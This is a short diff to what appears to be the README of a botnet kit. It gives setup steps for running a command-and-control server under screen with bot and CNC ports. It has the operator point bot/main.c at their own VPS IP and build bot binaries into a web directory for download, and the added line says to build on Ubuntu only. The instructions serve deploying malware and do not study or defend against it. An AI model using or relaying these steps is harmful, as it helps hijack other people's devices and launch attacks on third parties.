@@ -16,3 +16,4 @@ screen ./server <botport> <threads> <cncport>
 - You should change change ip in bot/main.c to your vps ip and bot port screened already
 - Run: sh legacybotbuilder.sh and bins will be put into /var/www/html
 - Payload: You make it :v
+- USE ON UBUNTU ONLY OR FIND ANOTHER COMPILER!!!!!!!!
